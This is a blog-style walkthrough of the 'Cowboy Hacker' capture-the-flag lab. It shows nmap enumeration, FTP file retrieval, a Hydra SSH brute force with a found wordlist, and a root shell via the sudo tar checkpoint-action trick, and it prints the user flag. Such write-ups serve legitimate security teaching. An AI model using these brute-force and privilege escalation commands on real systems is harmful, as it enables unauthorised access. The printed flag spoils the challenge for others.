---
title: "ğŸ´ Cowboy Hacker â€” Privilege Escalation Walkthrough"
date: 2025-12-23 10:00:00 +0100
categories: [Blog]
tags: [introduction, cybersecurity, journey]
---

This section describes the full exploitation path, from initial enumeration to root privilege escalation, with a strong focus on methodology and reasoning, not just commands.

ğŸ” 1. Service Enumeration

The first step in any penetration test is identifying running services on the target machine.

sudo nmap -sV -Pn 10.81.140.17

Explanation:

-sV â†’ detects service versions

-Pn â†’ skips host discovery (useful when ICMP is blocked)

ğŸ“Œ Result:
The scan revealed that FTP and SSH services were running on the target.

ğŸ“ 2. FTP Enumeration and File Discovery

Since FTP was accessible, I attempted an FTP connection.

ftp 10.81.140.17


Inside the FTP server, two interesting files were found and downloaded:

ftp> get locks.txt
ftp> get task.txt

File Analysis:

locks.txt â†’ contains a list of possible passwords

task.txt â†’ mentions a user named lin

ğŸ“Œ This information strongly suggests a credential attack against the SSH service using:

Username: lin

Password list: locks.txt

ğŸ” 3. SSH Brute Force with Hydra

Using the information gathered, I performed a brute-force attack against SSH.

hydra -l lin -P locks.txt 10.81.140.17 ssh -F -V

Explanation:

-l lin â†’ target username

-P locks.txt â†’ password wordlist

ssh â†’ target service

-F â†’ stop after first valid password

-V â†’ verbose output

ğŸ“Œ Result:
Hydra successfully discovered valid SSH credentials.

ğŸ–¥ï¸ 4. Gaining User Access via SSH

With valid credentials, I logged into the machine:

ssh lin@10.81.140.17


Once logged in, I enumerated the userâ€™s home directory:

ls


Output:

user.txt


Reading the user flag:

cat user.txt


âœ… User Flag obtained:

THM{CR1M3_SyNd1C4T3}

ğŸš€ 5. Privilege Escalation Enumeration

After gaining user access, the next objective is privilege escalation.

The first and most important command to run is:

sudo -l

Why this command?

It answers one critical question:

â€œWhat commands can this user run as root?â€

Output Analysis:
User lin may run the following commands on ip-10-81-140-17:
    (root) /bin/tar


This output reveals three key facts:

Observation	Meaning
/bin/tar	The tar binary is allowed
(root)	It runs with root privileges
No password required	No authentication needed

ğŸš¨ This is a clear privilege escalation opportunity.

ğŸ§  6. Why GTFOBins?

At this stage, the correct pentesting mindset is:

â€œI can run a binary as root â€” can this binary be abused?â€

This is exactly where GTFOBins is used.

What is GTFOBins?

ğŸ“Œ GTFOBins is a curated database of Linux binaries that can be abused when executed with elevated privileges (sudo, SUID, capabilities).

Decision Process:
sudo -l
   â†“
Privileged binary found (tar)
   â†“
Search tar on GTFOBins


This is standard penetration testing methodology, not guessing.

ğŸ”“ 7. Exploiting tar to Gain Root Shell

GTFOBins shows that tar supports command execution via checkpoint options.

Exploit Command:
sudo tar -cf /dev/null /dev/null \
--checkpoint=1 \
--checkpoint-action=exec=/bin/sh

Technical Explanation:

sudo â†’ executes tar as root

--checkpoint=1 â†’ triggers a checkpoint immediately

--checkpoint-action=exec=/bin/sh â†’ executes a shell

Since tar runs as root â†’ the shell is root

âœ… 8. Root Access Confirmation
whoami


Output:

root


ğŸ‰ Root shell successfully obtained

ğŸ 9. Final Step â€” Root Flag
cat /root/root.txt


âœ… Root flag retrieved â€” room completed

ğŸ”‘ Key Takeaway (Very Important)

âŒ â€œI used GTFOBins because the walkthrough said so.â€
âœ… â€œI used GTFOBins because sudo -l exposed a privileged binary.â€

This mindset is what separates:

command copy-paste

from real penetration testing thinking